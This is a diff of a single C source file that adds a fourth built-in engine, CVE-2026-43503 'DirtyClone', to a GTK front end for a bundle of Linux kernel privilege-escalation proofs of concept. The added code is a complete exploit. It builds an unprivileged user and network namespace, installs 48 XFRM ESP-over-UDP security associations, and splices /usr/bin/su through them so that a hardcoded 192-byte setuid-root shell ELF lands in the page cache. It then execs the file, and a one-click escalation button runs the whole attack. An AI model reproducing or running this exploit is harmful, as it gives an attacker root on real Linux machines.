@@ -1,15 +1,17 @@
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyChains 七链页缓存提权 PoC
+ *  dirtyfrag-gui.c — DirtyChains 八链页缓存提权 PoC
  *                    图形前端 + 内置引擎（单文件）
  *
- *  一个 .c 就能编出完整程序，不再需要额外的 .o，文件里合了三块：
+ *  一个 .c 就能编出完整程序，不再需要额外的 .o，文件里合了四块：
  *
  *      OVS 引擎（原 ovswrap.c 全文）
  *          CVE-2026-64531 net/openvswitch CT action 越界，入口 ovswrap_main
- *      Fragnesia 引擎（上游 PoC 并入，见第三条链）
+ *      Fragnesia 引擎（上游 PoC 并入）
  *          CVE-2026-46300 xfrm/espintcp 页缓存改写，入口 fragnesia_main
+ *      DirtyClone 引擎（上游 PoC 并入）
+ *          CVE-2026-43503 xfrm/esp-over-udp 页缓存改写，入口 cve43503_main
  *      GTK3 前端（本项目前身 dirtyfrag-gui.c）
- *          七链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
+ *          八链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
  *
  *  编译（GUI）:
  *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
@@ -78,6 +80,10 @@
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/uio.h>
+#include <linux/rtnetlink.h>
+#include <linux/xfrm.h>
 
 #define OVSWRAP_VERSION "0.1"
 
@@ -3783,7 +3789,7 @@ int ovswrap_main(int argc, char **argv)
 #ifndef OVSWRAP_STANDALONE
 
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyChains 七链页缓存提权 PoC 的图形前端
+ *  dirtyfrag-gui.c — DirtyChains 八链页缓存提权 PoC 的图形前端
  *
  *  适配 XFCE 桌面 (GTK3)。它本身不做任何内核操作, 只负责:
  *      · 拼出正确的命令行
@@ -5179,10 +5185,506 @@ int fragnesia_main(int argc, char **argv)
     return fragnesia_run(pn, pa);
 }
 
+
+/* ==========================================================================
+ *  DirtyClone 引擎：CVE-2026-43503（入口 cve43503_main）
+ *
+ *  代码取自上游 PoC（Ashraf Zaryouh "0xBlackash"），攻击逻辑保持原样，只动了
+ *  几处让它能安全地跑在 GUI 的子进程里：
+ *    · main() 改名 cve43503_main()，usage 单独一份，避免和本文件其它入口撞名；
+ *    · 目标路径与起始偏移改为命令行传入（-t / -offset），默认 /usr/bin/su、0；
+ *    · 去掉原来「uid==0 就 execlp("/bin/sh")」那段——在 GUI 里会莫名其妙弹 shell；
+ *    · 加一道 gate：目标必须是普通文件、>= 4096 字节、且对当前用户不可写，
+ *      不满足就 exit 2/4。root 跑会被挡住，避免把系统 su 打成后门；
+ *    · setup_userns_netns() 里的 exit(1) 改成返回 -1，错误码交给调用者；
+ *    · 新增 -check：只建 userns/netns 再装一个 XFRM SA 试水，不碰任何文件。
+ *
+ *  原理：ESP over UDP（encap 端口 4500）在 loopback 上收包时，xfrm 用 SA 里的
+ *  esn.seq_hi 拼出重组序列号；而 splice 进 socket 的「payload」其实是目标文件的
+ *  页，解密后这几个字节被当明文写回 page cache。一个 SA 只能带 4 字节，
+ *  所以 192 字节载荷 = 48 个 SA + 48 次 splice，每次之间要等一下收包。
+ *
+ *  退出码（和 46300 相反，和主引擎一致）：
+ *    0 = 写成功（有漏洞） / 1 = 写失败或校验不过 / 2 = 目标不合法 / 4 = 前置条件不满足
+ * ==========================================================================*/
+
+#define DC43503_PAYLOAD_LEN 192
+#define DC43503_ENC_PORT    4500
+#define DC43503_SEQ_VAL     200
+#define DC43503_REPLAY_SEQ  100
+#define DC43503_ENTRY_OFF   0x78    /* 载荷内用于自检的偏移（xor edi,edi） */
+#define DC43503_MIN_LEN     4096
+#define DC43503_SPI_BASE    0xDEADBE10u
+
+static const char *dc43503_target = "/usr/bin/su";
+static off_t dc43503_offset;
+static int dc43503_verbose;
+
+#define DLOG(fmt, ...)                                                  \
+    do {                                                                \
+        if (dc43503_verbose)                                            \
+            fprintf(stderr, "[43503] " fmt "\n", ##__VA_ARGS__);         \
+    } while (0)
+
+static const uint8_t dc43503_elf[DC43503_PAYLOAD_LEN] = {
+    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
+    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
+    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
+    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
+    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+};
+
+static int dc43503_write_proc(const char *path, const char *buf)
+{
+    int fd, n;
+
+    fd = open(path, O_WRONLY);
+    if (fd < 0)
+        return -1;
+    n = (int)write(fd, buf, strlen(buf));
+    close(fd);
+    return n;
+}
+
+/* 建 userns + netns 并把 lo 拉起来。失败返回 -1，由调用者决定退出码 */
+static int dc43503_setup_ns(void)
+{
+    uid_t ruid = getuid();
+    gid_t rgid = getgid();
+    struct ifreq ifr;
+    char map[64];
+    int s;
+
+    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
+        fprintf(stderr, "unshare: %s\n", strerror(errno));
+        return -1;
+    }
+    dc43503_write_proc("/proc/self/setgroups", "deny");
+    snprintf(map, sizeof(map), "0 %u 1", (unsigned)ruid);
+    if (dc43503_write_proc("/proc/self/uid_map", map) < 0) {
+        fprintf(stderr, "uid_map: %s\n", strerror(errno));
+        return -1;
+    }
+    snprintf(map, sizeof(map), "0 %u 1", (unsigned)rgid);
+    if (dc43503_write_proc("/proc/self/gid_map", map) < 0) {
+        fprintf(stderr, "gid_map: %s\n", strerror(errno));
+        return -1;
+    }
+    printf("userns_setup: outer_uid=%u outer_gid=%u us_uid=0 ns_gid=0\n",
+           (unsigned)ruid, (unsigned)rgid);
+
+    s = socket(AF_INET, SOCK_DGRAM, 0);
+    if (s < 0) {
+        fprintf(stderr, "socket: %s\n", strerror(errno));
+        return -1;
+    }
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
+    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
+        fprintf(stderr, "SIOCGIFFLAGS: %s\n", strerror(errno));
+        close(s);
+        return -1;
+    }
+    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
+    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) {
+        fprintf(stderr, "SIOCSIFFLAGS: %s\n", strerror(errno));
+        close(s);
+        return -1;
+    }
+    close(s);
+    printf("netns_setup=1 loopback=up\n");
+    return 0;
+}
+
+static void dc43503_put_attr(struct nlmsghdr *nlh, int type,
+                             const void *data, size_t len)
+{
+    struct rtattr *rta = (struct rtattr *)((char *)nlh +
+                                           NLMSG_ALIGN(nlh->nlmsg_len));
+
+    rta->rta_type = type;
+    rta->rta_len  = RTA_LENGTH(len);
+    memcpy(RTA_DATA(rta), data, len);
+    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
+}
+
+/* 装一个 SA；patch_seqhi 就是这一次要写进文件的 4 字节 */
+static int dc43503_add_sa(uint32_t spi, uint32_t patch_seqhi)
+{
+    int sk;
+    struct sockaddr_nl nl;
+    char buf[4096];
+    char rbuf[4096];
+    struct nlmsghdr *nlh;
+    struct xfrm_usersa_info *xs;
+    int n;
+
+    sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+    if (sk < 0)
+        return -1;
+    memset(&nl, 0, sizeof(nl));
+    nl.nl_family = AF_NETLINK;
+    if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0) {
+        close(sk);
+        return -1;
+    }
+
+    memset(buf, 0, sizeof(buf));
+    nlh = (struct nlmsghdr *)buf;
+    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
+    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+    nlh->nlmsg_pid   = (unsigned)getpid();
+    nlh->nlmsg_seq   = 1;
+    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
+
+    xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
+    xs->id.daddr.a4 = inet_addr("127.0.0.1");
+    xs->id.spi      = htonl(spi);
+    xs->id.proto    = IPPROTO_ESP;
+    xs->saddr.a4    = inet_addr("127.0.0.1");
+    xs->family      = AF_INET;
+    xs->mode        = XFRM_MODE_TRANSPORT;
+    xs->replay_window = 0;
+    xs->reqid       = 0x1234;
+    xs->flags       = XFRM_STATE_ESN;
+    xs->lft.soft_byte_limit   = (uint64_t)-1;
+    xs->lft.hard_byte_limit   = (uint64_t)-1;
+    xs->lft.soft_packet_limit = (uint64_t)-1;
+    xs->lft.hard_packet_limit = (uint64_t)-1;
+    xs->sel.family  = AF_INET;
+    xs->sel.prefixlen_d = 32;
+    xs->sel.prefixlen_s = 32;
+    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
+    xs->sel.saddr.a4 = inet_addr("127.0.0.1");
+
+    {
+        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
+        struct xfrm_algo_auth *aa;
+
+        memset(alg_buf, 0, sizeof(alg_buf));
+        aa = (struct xfrm_algo_auth *)alg_buf;
+        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
+        aa->alg_key_len   = 32 * 8;
+        aa->alg_trunc_len = 128;
+        memset(aa->alg_key, 0xAA, 32);
+        dc43503_put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
+    }
+    {
+        char alg_buf[sizeof(struct xfrm_algo) + 16];
+        struct xfrm_algo *ea;
+
+        memset(alg_buf, 0, sizeof(alg_buf));
+        ea = (struct xfrm_algo *)alg_buf;
+        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
+        ea->alg_key_len = 16 * 8;
+        memset(ea->alg_key, 0xBB, 16);
+        dc43503_put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
+    }
+    {
+        struct xfrm_encap_tmpl enc;
+
+        memset(&enc, 0, sizeof(enc));
+        enc.encap_type  = UDP_ENCAP_ESPINUDP;
+        enc.encap_sport = htons(DC43503_ENC_PORT);
+        enc.encap_dport = htons(DC43503_ENC_PORT);
+        enc.encap_oa.a4 = 0;
+        dc43503_put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
+    }
+    {
+        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
+        struct xfrm_replay_state_esn *esn;
+
+        memset(esn_buf, 0, sizeof(esn_buf));
+        esn = (struct xfrm_replay_state_esn *)esn_buf;
+        esn->bmp_len       = 1;
+        esn->oseq          = 0;
+        esn->seq           = DC43503_REPLAY_SEQ;
+        esn->oseq_hi       = 0;
+        esn->seq_hi        = patch_seqhi;
+        esn->replay_window = 32;
+        dc43503_put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
+    }
+
+    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
+        close(sk);
+        return -1;
+    }
+    n = (int)recv(sk, rbuf, sizeof(rbuf), 0);
+    if (n < 0) {
+        close(sk);
+        return -1;
+    }
+    {
+        struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
+
+        if (rh->nlmsg_type == NLMSG_ERROR) {
+            struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(rh);
+
+            if (e->error) {
+                errno = -e->error;
+                close(sk);
+                return -1;
+            }
+        }
+    }
+    close(sk);
+    return 0;
+}
+
+/* 一次 splice：从目标文件的 offset 处搬 16 字节当 ESP payload 发给自己 */
+static int dc43503_one_write(const char *path, off_t offset, uint32_t spi)
+{
+    int sk_recv, sk_send, file_fd, pfd[2], one = 1, encap;
+    struct sockaddr_in sa_d;
+    uint8_t hdr[24];
+    struct iovec iov_h;
+    off_t off;
+    ssize_t s;
+
+    sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sk_recv < 0)
+        return -1;
+    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+    memset(&sa_d, 0, sizeof(sa_d));
+    sa_d.sin_family      = AF_INET;
+    sa_d.sin_port        = htons(DC43503_ENC_PORT);
+    sa_d.sin_addr.s_addr = inet_addr("127.0.0.1");
+    if (bind(sk_recv, (struct sockaddr *)&sa_d, sizeof(sa_d)) < 0) {
+        close(sk_recv);
+        return -1;
+    }
+    encap = UDP_ENCAP_ESPINUDP;
+    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
+        close(sk_recv);
+        return -1;
+    }
+    sk_send = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sk_send < 0) {
+        close(sk_recv);
+        return -1;
+    }
+    if (connect(sk_send, (struct sockaddr *)&sa_d, sizeof(sa_d)) < 0) {
+        close(sk_send);
+        close(sk_recv);
+        return -1;
+    }
+    file_fd = open(path, O_RDONLY);
+    if (file_fd < 0) {
+        close(sk_send);
+        close(sk_recv);
+        return -1;
+    }
+    if (pipe(pfd) < 0) {
+        close(file_fd);
+        close(sk_send);
+        close(sk_recv);
+        return -1;
+    }
+
+    *(uint32_t *)(hdr + 0) = htonl(spi);
+    *(uint32_t *)(hdr + 4) = htonl(DC43503_SEQ_VAL);
+    memset(hdr + 8, 0xCC, 16);
+
+    iov_h.iov_base = hdr;
+    iov_h.iov_len  = sizeof(hdr);
+    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
+        close(file_fd); close(pfd[0]); close(pfd[1]);
+        close(sk_send); close(sk_recv);
+        return -1;
+    }
+    off = offset;
+    s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
+    if (s != 16) {
+        close(file_fd); close(pfd[0]); close(pfd[1]);
+        close(sk_send); close(sk_recv);
+        return -1;
+    }
+    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
+    if (s < 0)
+        DLOG("splice to socket: %s", strerror(errno));
+
+    usleep(150 * 1000);
+
+    close(file_fd); close(pfd[0]); close(pfd[1]);
+    close(sk_send); close(sk_recv);
+    return 0;
+}
+
+static int dc43503_verify_byte(const char *path, off_t offset, uint8_t want)
+{
+    uint8_t got;
+    int fd;
+
+    fd = open(path, O_RDONLY);
+    if (fd < 0)
+        return -1;
+    if (pread(fd, &got, 1, offset) != 1) {
+        close(fd);
+        return -1;
+    }
+    close(fd);
+    return got == want ? 0 : -1;
+}
+
+/* 返回 0 = 通过；2 = 目标不合法；4 = 目标对当前用户可写（测不出越权） */
+static int dc43503_gate(void)
+{
+    struct stat st;
+    int fd;
+
+    if (stat(dc43503_target, &st) < 0) {
+        fprintf(stderr, "stat %s: %s\n", dc43503_target, strerror(errno));
+        return 2;
+    }
+    if (!S_ISREG(st.st_mode)) {
+        fprintf(stderr, "target is not a regular file\n");
+        return 2;
+    }
+    if (st.st_size < DC43503_MIN_LEN) {
+        fprintf(stderr, "target is too small: size=%lld need>=%d\n",
+                (long long)st.st_size, DC43503_MIN_LEN);
+        return 2;
+    }
+    errno = 0;
+    fd = open(dc43503_target, O_WRONLY | O_CLOEXEC);
+    if (fd >= 0) {
+        close(fd);
+        printf("gate_failed: outer write-open unexpectedly succeeded\n");
+        return 4;
+    }
+    printf("outer_write_open_denied=1 errno=%d (%s)\n", errno, strerror(errno));
+    return 0;
+}
+
+/* 装 48 个 SA → 48 次 splice → 逐字节回读校验 */
+static int dc43503_write_payload(void)
+{
+    int i, bad = 0;
+
+    for (i = 0; i < DC43503_PAYLOAD_LEN / 4; i++) {
+        uint32_t spi   = DC43503_SPI_BASE + (uint32_t)i;
+        uint32_t seqhi = ((uint32_t)dc43503_elf[i * 4 + 0] << 24) |
+                         ((uint32_t)dc43503_elf[i * 4 + 1] << 16) |
+                         ((uint32_t)dc43503_elf[i * 4 + 2] <<  8) |
+                         ((uint32_t)dc43503_elf[i * 4 + 3]);
+
+        if (dc43503_add_sa(spi, seqhi) < 0) {
+            fprintf(stderr, "xfrm_sa_add #%d failed: %s\n", i, strerror(errno));
+            return -1;
+        }
+    }
+    printf("xfrm_sa_installed=%d\n", DC43503_PAYLOAD_LEN / 4);
+
+    for (i = 0; i < DC43503_PAYLOAD_LEN / 4; i++) {
+        uint32_t spi = DC43503_SPI_BASE + (uint32_t)i;
+
+        if (dc43503_one_write(dc43503_target,
+                              dc43503_offset + (off_t)i * 4, spi) < 0) {
+            fprintf(stderr, "splice_write #%d failed: %s\n", i, strerror(errno));
+            return -1;
+        }
+    }
+    printf("spliced %d bytes at offset %lld\n", DC43503_PAYLOAD_LEN,
+           (long long)dc43503_offset);
+
+    for (i = 0; i < DC43503_PAYLOAD_LEN; i++)
+        if (dc43503_verify_byte(dc43503_target,
+                                dc43503_offset + i, dc43503_elf[i]) != 0)
+            bad++;
+
+    printf("bytes_flip_summary len=%d mismatch=%d\n", DC43503_PAYLOAD_LEN, bad);
+    return bad == 0 ? 0 : -1;
+}
+
+static void dc43503_usage(const char *prog)
+{
+    fprintf(stderr,
+        "usage: %s [-start|-test|-check] [-t target] [-offset N] [-v]\n"
+        "  -check   只探测 userns/netns + XFRM, 不写任何文件\n"
+        "  -test    写 192 字节到目标页缓存并回读校验, 不 exec\n"
+        "  -start   写成功后 exec 目标（默认行为）\n"
+        "  -t       目标文件, 默认 /usr/bin/su；需 >= 4096 字节且对当前用户不可写\n"
+        "  -offset  起始偏移, 默认 0（按 4 字节粒度）\n", prog);
+}
+
+int cve43503_main(int argc, char **argv)
+{
+    int mode = 0;               /* 0=start 1=test 2=check */
+    int i, rc;
+
+    for (i = 1; i < argc; i++) {
+        const char *s = argv[i];
+
+        if (!strcmp(s, "-start"))
+            mode = 0;
+        else if (!strcmp(s, "-test"))
+            mode = 1;
+        else if (!strcmp(s, "-check"))
+            mode = 2;
+        else if (!strcmp(s, "-t") && i + 1 < argc)
+            dc43503_target = argv[++i];
+        else if (!strcmp(s, "-offset") && i + 1 < argc)
+            dc43503_offset = (off_t)strtoll(argv[++i], NULL, 0);
+        else if (!strcmp(s, "-v") || !strcmp(s, "--verbose"))
+            dc43503_verbose = 1;
+        else if (!strcmp(s, "-h") || !strcmp(s, "--help")) {
+            dc43503_usage("dirtychains");
+            return 2;
+        }
+    }
+    if (getenv("DIRTYFRAG_VERBOSE"))
+        dc43503_verbose = 1;
+
+    printf("[*] uid=%d euid=%d target=%s offset=%lld\n",
+           (int)getuid(), (int)geteuid(), dc43503_target,
+           (long long)dc43503_offset);
+    if (mode == 2)
+        printf("[*] 只探测前置条件, 不改写任何文件\n");
+
+    rc = dc43503_gate();
+    if (rc)
+        return rc;
+
+    if (dc43503_setup_ns() < 0)
+        return 4;
+
+    if (mode == 2) {
+        if (dc43503_add_sa(DC43503_SPI_BASE, 0) < 0) {
+            fprintf(stderr, "xfrm_sa_add probe failed: %s\n", strerror(errno));
+            return 4;
+        }
+        printf("[+] 前置条件齐备: userns + netns + XFRM ESP(UDP) 可用, "
+               "目标对当前用户不可写\n");
+        return 0;
+    }
+
+    if (dc43503_write_payload() != 0) {
+        printf("[-] 写原语失败\n");
+        return 1;
+    }
+    printf("[+] 目标前 %d 字节已被改写\n", DC43503_PAYLOAD_LEN);
+
+    if (mode == 0) {
+        printf("[*] exec %s\n", dc43503_target);
+        fflush(NULL);
+        execl(dc43503_target, dc43503_target, (char *)NULL);
+        fprintf(stderr, "exec %s: %s\n", dc43503_target, strerror(errno));
+        return 1;
+    }
+    return 0;
+}
+
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-11-01-r33"
-#define APP_SUBTITLE    "七链 PoC 图形前端 · " DF_BUILD
+#define DF_BUILD        "2026-11-01-r34"
+#define APP_SUBTITLE    "八链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
 #define PTY_ROWS        32
@@ -5246,6 +5748,12 @@ static const Chain chains[] = {
       "需非特权 userns + XFRM espintcp"
       "（Ubuntu 先关 apparmor_restrict_unprivileged_userns）", 2,
       1, 0, 1 },
+
+    { "-2026-43503", "43503 · DirtyClone",
+      "CVE-2026-43503  XFRM / ESP over UDP",
+      "ESP 的 esn.seq_hi 被当明文写回页缓存, 一个 SA 带 4 字节",
+      "需非特权 userns + XFRM espinudp(4500)；192 字节载荷 = 48 个 SA", 3,
+      1, 0, 1 },
 };
 #define N_CHAINS ((int)(sizeof(chains) / sizeof(chains[0])))
 
@@ -5253,7 +5761,7 @@ static const Chain chains[] = {
  * 侧栏类别表。单链类 (members == NULL) 点击直接切链;
  * 多链类点击后弹窗, 让用户在同一类里挑具体漏洞。
  */
-static const int cat_write_members[] = { 0, 1, 6 }; /* 31431 / 43284 / 46300 */
+static const int cat_write_members[] = { 0, 1, 6, 7 }; /* 31431 / 43284 / 46300 / 43503 */
 static const int cat_oob_members[]   = { 2, 4, 5 }; /* 43500 / 46331 / 64531 */
 
 static const struct {
@@ -5938,6 +6446,46 @@ static void on_child_exit(GPid pid, gint status, gpointer data)
             app_set_busy(a, FALSE);
             return;
         }
+
+        /* CVE-2026-43503 这条和主引擎一致: 0 = 写成功, 1 = 没打成 */
+        if (cc && cc->engine == 3) {
+            char line[200];
+
+            switch (code) {
+            case 0:
+                if (a->action && strstr(a->action, "检查")) {
+                    verdict = "前置条件齐备 (退出码 0)";
+                } else {
+                    verdict = "有漏洞：目标字节被改写 (退出码 0)";
+                }
+                color = "status-ok";
+                break;
+            case 1:
+                verdict = "没打成：写原语或校验失败 (退出码 1)";
+                color = "status-warn";
+                break;
+            case 2:
+                verdict = "参数或目标文件不合法 (退出码 2)";
+                color = "status-warn";
+                break;
+            case 4:
+                verdict = "被前置条件挡住 (退出码 4)";
+                color = "status-warn";
+                break;
+            default:
+                verdict = (code > 128) ? "被信号终止" : "异常退出";
+                color = "status-err";
+                break;
+            }
+
+            g_snprintf(line, sizeof(line), "\n── 进程结束: %s ──\n", verdict);
+            log_flush(a);
+            log_append_plain(a, line);
+            gtk_widget_set_name(a->status_lbl, color);
+            gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);
+            app_set_busy(a, FALSE);
+            return;
+        }
     }
 
     /* -check 的 1 表示"没读到配置", 与"写了没生效"是两回事 */
@@ -6016,7 +6564,9 @@ static gboolean app_spawn(App *a, char **args, const char *what)
     pid_t pid;
     const Chain *c = cur_chain(a);
     int eng = c ? c->engine : 0;
-    const char *esw = (eng == 1) ? "--ovs" : (eng == 2) ? "--frag" : "--engine";
+    const char *esw = (eng == 1) ? "--ovs"
+                    : (eng == 2) ? "--frag"
+                    : (eng == 3) ? "--cve43503" : "--engine";
     char eflag[16] = "";
 
     if (eng != 0 && !a->poc_builtin) {
@@ -6184,7 +6734,7 @@ static void update_desc(App *a)
 
     if (idx == 0) {
         gtk_label_set_markup(GTK_LABEL(a->lbl_name),
-                             "<b>全部（dirtychains 七链）</b>");
+                             "<b>全部（dirtychains 八链）</b>");
         gtk_label_set_text(GTK_LABEL(a->lbl_desc),
                            "检查配置与自测会依次跑完 dirtychains 各链；OVS 链与 Fragnesia 链请单独选择后再操作。");
         gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
@@ -6334,7 +6884,7 @@ static void sync_params_ui(App *a)
         /* 占位提示随链微调 */
         if (c->engine == 1)
             gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target), "");
-        else if (c->engine == 2)
+        else if (c->engine == 2 || c->engine == 3)
             gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
                                            "目标文件 (默认 /usr/bin/su，只改页缓存)");
         else if (!strcmp(c->id, "-2026-43500"))
@@ -6440,6 +6990,21 @@ static void act_check(GtkWidget *w, gpointer data)
         return;
     }
 
+    if (c && c->engine == 3) {
+        const char *tg = entry_text(a->entry_target);
+        char *cl_args[4];
+        int k = 0;
+
+        cl_args[k++] = "-check";
+        if (tg) {
+            cl_args[k++] = "-t";
+            cl_args[k++] = (char *)tg;
+        }
+        cl_args[k] = NULL;
+        app_spawn(a, cl_args, "检查 DirtyClone 前置条件");
+        return;
+    }
+
     if (c && c->engine == 1) {
         char *ovs_args[] = { "-check", NULL };
 
@@ -6494,6 +7059,36 @@ static void act_test(GtkWidget *w, gpointer data)
                          "页缓存被写脏后可能回写磁盘，请只在自有机器上跑。"))
             return;
         app_spawn(a, fr_args, "自测 Fragnesia 写原语");
+        return;
+    }
+
+    if (c && c->engine == 3) {
+        const char *tg = entry_text(a->entry_target);
+        const char *of = entry_text(a->entry_offset);
+        char *cl_args[8];
+        char cmd[600];
+        int k = 0;
+
+        cl_args[k++] = "-test";
+        if (tg) {
+            cl_args[k++] = "-t";
+            cl_args[k++] = (char *)tg;
+        }
+        if (of) {
+            cl_args[k++] = "-offset";
+            cl_args[k++] = (char *)of;
+        }
+        cl_args[k] = NULL;
+
+        g_snprintf(cmd, sizeof(cmd), "%s --cve43503 -test -t %s%s%s",
+                   a->poc_path, tg ? tg : "/usr/bin/su",
+                   of ? " -offset " : "", of ? of : "");
+        if (!confirm_run(a, "DirtyClone 自测", cmd,
+                         "会改写目标文件前 192 字节的页缓存（改完不 exec 目标）。"
+                         "一个 SA 只能带 4 字节，192 字节要装 48 个 SA、发 48 次包，"
+                         "大约 8 秒。页缓存被写脏后可能回写磁盘，请只在自有机器上跑。"))
+            return;
+        app_spawn(a, cl_args, "自测 DirtyClone 写原语");
         return;
     }
 
@@ -6575,6 +7170,38 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "成功即拿到 root shell；失败时原文件不受影响（只动页缓存）。"))
             return;
         app_spawn(a, fr_args, "一键提权");
+        return;
+    }
+
+    /* DirtyClone 链：-start 写完页缓存直接 exec 目标，pty 里就是 root shell */
+    if (c->engine == 3) {
+        const char *tg = entry_text(a->entry_target);
+        const char *of = entry_text(a->entry_offset);
+        char *cl_args[8];
+        char cl_cmd[600];
+        int k = 0;
+
+        cl_args[k++] = "-start";
+        if (tg) {
+            cl_args[k++] = "-t";
+            cl_args[k++] = (char *)tg;
+        }
+        if (of) {
+            cl_args[k++] = "-offset";
+            cl_args[k++] = (char *)of;
+        }
+        cl_args[k] = NULL;
+
+        g_snprintf(cl_cmd, sizeof(cl_cmd), "%s --cve43503 -start -t %s%s%s",
+                   a->poc_path, tg ? tg : "/usr/bin/su",
+                   of ? " -offset " : "", of ? of : "");
+        if (!confirm_run(a, c->name, cl_cmd,
+                         "会把目标文件前 192 字节的页缓存换成一段 "
+                         "setuid(0)+execve(/bin/sh) 的 ELF，然后 exec 该文件 —— "
+                         "成功即拿到 root shell；失败时原文件不受影响（只动页缓存）。"
+                         "整个过程约 8 秒。"))
+            return;
+        app_spawn(a, cl_args, "一键提权");
         return;
     }
 
@@ -6675,6 +7302,13 @@ static void act_write(GtkWidget *w, gpointer data)
         show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                   "CVE-2026-46300 的载荷固定为内置的 192 字节 ELF，"
                   "只覆盖目标文件开头这一段。",
+                  "要换目标就改「目标文件」和「偏移」，然后点「一键提权」。");
+        return;
+    }
+    if (c->engine == 3) {
+        show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
+                  "CVE-2026-43503 的载荷同样固定为 192 字节 ELF，"
+                  "而且一次只能写 4 字节，得装 48 个 SA 才写满。",
                   "要换目标就改「目标文件」和「偏移」，然后点「一键提权」。");
         return;
     }
@@ -9329,7 +9963,7 @@ static void build_window(App *a)
      */
     a->combo = gtk_combo_box_text_new();
     gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo),
-                                   "全部（dirtychains 七链，仅检查 / 自测）");
+                                   "全部（dirtychains 八链，仅检查 / 自测）");
     {
         int i;
         for (i = 0; i < N_CHAINS; i++) {
@@ -9587,6 +10221,18 @@ int main(int argc, char **argv)
         return rc;
     }
 
+    /* 第四条内置引擎: CVE-2026-43503 (DirtyClone) */
+    if (argc > 1 && !strcmp(argv[1], "--cve43503")) {
+        int rc;
+
+        argv++;
+        argc--;
+        argv[0] = (char *)"dirtychains";
+        rc = cve43503_main(argc, argv);
+        fflush(NULL);
+        return rc;
+    }
+
     memset(&app, 0, sizeof(app));
     app.master_fd = -1;
     app.cur_fg = -1;
@@ -9645,7 +10291,7 @@ int main(int argc, char **argv)
     {
         char head[512];
         g_snprintf(head, sizeof(head),
